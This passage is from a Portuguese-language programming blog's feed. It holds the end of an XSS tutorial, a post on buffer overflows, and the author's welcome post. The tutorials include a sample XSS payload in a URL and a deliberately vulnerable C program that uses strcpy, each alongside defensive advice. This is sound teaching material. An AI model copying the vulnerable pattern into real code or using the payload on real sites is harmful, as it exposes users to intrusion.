<p>Neste exemplo, o script JavaScript lê o valor da pesquisa diretamente do fragmento da URL (parte após o símbolo “#”) e insere-o no elemento HTML. Se um atacante criar um link como https://example.com/search#<script>alert('XSS')</script>, o navegador da vítima executará o script malicioso ao acessar o link.</p>

<h2 id="conclusão">Conclusão</h2>

<p>O Cross-Site Scripting (XSS) é uma das vulnerabilidades mais comuns em aplicações web. Para proteger seu site contra ataques de XSS, é importante seguir boas práticas de segurança, como a sanitização adequada das entradas dos usuários e a validação das entradas do lado do cliente e do servidor.</p>

<p>Também é essencial usar políticas de segurança de conteúdo (Content Security Policy - CSP) para limitar a execução de scripts de origens não confiáveis e impedir a exploração de vulnerabilidades XSS. Além disso, é importante manter-se atualizado sobre as últimas tendências e técnicas de ataque para garantir a segurança contínua de sua aplicação web.</p>

<p>Ao adotar essas práticas e conscientizar-se das diferentes formas de XSS, como XSS Persistente, XSS Refletido e XSS Baseado em DOM, você estará mais bem preparado para identificar e mitigar possíveis vulnerabilidades em seu site ou aplicação web.</p>]]></content><author><name></name></author><category term="Segurança" /><category term="Programação" /><category term="Vulnerabilidades" /><category term="XSS" /><summary type="html"><![CDATA[Olá! Neste post, vamos discutir o conceito de Cross-Site Scripting (XSS) e ver alguns exemplos que ilustram essa vulnerabilidade comum em aplicações web. Vamos aprender sobre as causas desse problema, como explorá-lo e como evitá-lo.]]></summary></entry><entry><title type="html">Entendendo o Buffer Overflow: Conceitos e Exemplos</title><link href="http://localhost:4000/seguran%C3%A7a/programa%C3%A7%C3%A3o/vulnerabilidades/bufferoverflow/2023/05/02/Entendendo-o-Buffer-Overflow.html" rel="alternate" type="text/html" title="Entendendo o Buffer Overflow: Conceitos e Exemplos" /><published>2023-05-02T22:48:46-03:00</published><updated>2023-05-02T22:48:46-03:00</updated><id>http://localhost:4000/seguran%C3%A7a/programa%C3%A7%C3%A3o/vulnerabilidades/bufferoverflow/2023/05/02/Entendendo-o-Buffer-Overflow</id><content type="html" xml:base="http://localhost:4000/seguran%C3%A7a/programa%C3%A7%C3%A3o/vulnerabilidades/bufferoverflow/2023/05/02/Entendendo-o-Buffer-Overflow.html"><![CDATA[<p>Olá! Neste post, vamos discutir o conceito de <strong>buffer overflow</strong> e ver alguns exemplos que ilustram essa vulnerabilidade comum em programas de computador. Vamos aprender sobre as causas desse problema, como explorá-lo e como evitá-lo.</p>

<h2 id="o-que-é-buffer-overflow">O que é Buffer Overflow?</h2>

<p>Buffer overflow é uma vulnerabilidade que ocorre quando um programa tenta escrever mais dados em um buffer do que ele foi projetado para armazenar. Isso pode resultar em comportamento imprevisível, como a corrupção de dados adjacentes na memória, travamento do programa ou, em casos mais sérios, a execução de código malicioso.</p>

<h2 id="por-que-isso-acontece">Por que isso acontece?</h2>

<p>Muitas vezes, buffer overflows ocorrem devido à falta de validação de entrada ou ao uso de funções inseguras que não verificam o tamanho do buffer. Linguagens de programação de baixo nível, como C e C++, são particularmente vulneráveis a buffer overflows, pois não possuem verificações automáticas de limites de buffer.</p>

<h2 id="exemplo-de-buffer-overflow">Exemplo de Buffer Overflow</h2>

<p>Vamos analisar um exemplo simples de buffer overflow em C:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">vulnerable_function</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Uso: %s &lt;input_string&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">vulnerable_function</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Neste exemplo, a função <code class="language-plaintext highlighter-rouge">vulnerable_function</code> usa a função <code class="language-plaintext highlighter-rouge">strcpy</code> para copiar a string de entrada para um buffer de tamanho fixo. No entanto, <code class="language-plaintext highlighter-rouge">strcpy</code> não verifica o tamanho do buffer e pode causar um overflow se a string de entrada for maior que o tamanho do buffer.</p>

<h2 id="como-explorar-e-evitar-buffer-overflows">Como explorar e evitar Buffer Overflows</h2>

<p>Os atacantes podem explorar buffer overflows para injetar e executar código malicioso, causar a negação de serviço ou ganhar acesso não autorizado a sistemas. Existem várias técnicas para explorar buffer overflows, como o <a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">Return-to-libc</a> e o <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP (Return-oriented programming)</a>.</p>

<p>Para evitar buffer overflows, os desenvolvedores podem adotar as seguintes práticas:</p>

<ol>
  <li><strong>Validar a entrada do usuário</strong>: Sempre valide o tamanho e o conteúdo das entradas do usuário antes de processá-las.</li>
  <li><strong>Usar funções seguras</strong>: Evite usar funções inseguras que não verificam o tamanho do buffer, como <code class="language-plaintext highlighter-rouge">strcpy</code>, <code class="language-plaintext highlighter-rouge">gets</code> e <code class="language-plaintext highlighter-rouge">sprintf</code>. Em vez disso, use funções seguras, como <code class="language-plaintext highlighter-rouge">strncpy</code>, <code class="language-plaintext highlighter-rouge">fgets</code> e <code class="language-plaintext highlighter-rouge">snprintf</code>.</li>
  <li><strong>Habilitar proteções de compilador</strong>: Ative proteções como <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR (Address Space Layout Randomization)</a> e <a href="https://en.wikipedia.org/wiki/Data_Execution_Prevention">DEP (Data Execution Prevention)</a> para dificultar a exploração de buffer overflows.</li>
</ol>

<p>Espero que este post tenha ajudado a entender melhor o conceito de buffer overflow, suas causas e como evitá-lo. Ao seguir as práticas recomendadas, você pode minimizar as chances de introduzir vulnerabilidades de buffer overflow em seu código e proteger seus programas contra ataques maliciosos.</p>]]></content><author><name></name></author><category term="Segurança" /><category term="Programação" /><category term="Vulnerabilidades" /><category term="BufferOverflow" /><summary type="html"><![CDATA[Olá! Neste post, vamos discutir o conceito de buffer overflow e ver alguns exemplos que ilustram essa vulnerabilidade comum em programas de computador. Vamos aprender sobre as causas desse problema, como explorá-lo e como evitá-lo.]]></summary></entry><entry><title type="html">Bem vindo ao blog do ItaloCobains</title><link href="http://localhost:4000/programa%C3%A7%C3%A3o/inicio/web/baixo/nivel/2023/05/02/Bem-vindo-ao-blog-do-ItaloCobains.html" rel="alternate" type="text/html" title="Bem vindo ao blog do ItaloCobains" /><published>2023-05-02T21:48:46-03:00</published><updated>2023-05-02T21:48:46-03:00</updated><id>http://localhost:4000/programa%C3%A7%C3%A3o/inicio/web/baixo/nivel/2023/05/02/Bem-vindo-ao-blog-do-ItaloCobains</id><content type="html" xml:base="http://localhost:4000/programa%C3%A7%C3%A3o/inicio/web/baixo/nivel/2023/05/02/Bem-vindo-ao-blog-do-ItaloCobains.html"><![CDATA[<p>Olá! Meu nome é <strong>Italo Brito Brandão</strong>, mas sou mais conhecido na comunidade como <em>ItaloCobains</em>. Comecei a aprender a programar aos 16 anos, usando o Visualg. Sempre gostei de criar algoritmos e enfrentar desafios. Depois de um tempo, comecei a aprender sobre desenvolvimento web, estudando HTML e CSS, o que me proporcionou uma base sólida para aprender frameworks mais adiante.</p>

<p>Embora o próximo passo lógico fosse aprender JavaScript, decidi mudar um pouco e aprender uma linguagem de programação consolidada: Python. Após um ano programando em Python, busquei algo mais desafiador e mergulhei no mundo da linguagem C. Foi um processo difícil, e cheguei a odiar a linguagem C por um tempo. No entanto, conforme fui aprendendo mais sobre ciência da computação, a linguagem C começou a fazer sentido para mim.</p>

<p>Com o tempo, voltei para o desenvolvimento web e finalmente aprendi JavaScript. Assim, fui me aprofundando em frameworks e bibliotecas como React, Next.js e outros, tornando-me um desenvolvedor Full Stack. Depois de dominar o desenvolvimento web, retomei o estudo de programação de baixo nível.</p>

<p>Li livros como <em>“Programação em Baixo Nível: C, Assembly e Execução de Programas na Arquitetura Intel 64”</em> de Igor Zhirkov e <em>“Código Limpo”</em>, muito conhecido na comunidade. Ao mesmo tempo, comecei a estudar processos de memória e, como teste, hackeava a memória de jogos antigos para entender como ela funcionava e como os desenvolvedores de jogos organizavam a memória.</p>

<p>Atualmente, trabalho em um projeto open source de uma linguagem de programação em português chamada <a href="https://github.com/DesignLiquido/delegua">Delegua</a> e desenvolvo softwares para empresas da minha cidade. Eu amo programar e estou animado para compartilhar minha jornada e conhecimento neste blog!</p>]]></content><author><name></name></author><category term="Programação" /><category term="Inicio" /><category term="Web" /><category term="Baixo" /><category term="Nivel" /><summary type="html"><![CDATA[Olá! Meu nome é Italo Brito Brandão, mas sou mais conhecido na comunidade como ItaloCobains. Comecei a aprender a programar aos 16 anos, usando o Visualg. Sempre gostei de criar algoritmos e enfrentar desafios. Depois de um tempo, comecei a aprender sobre desenvolvimento web, estudando HTML e CSS, o que me proporcionou uma base sólida para aprender frameworks mais adiante.]]></summary></entry></feed>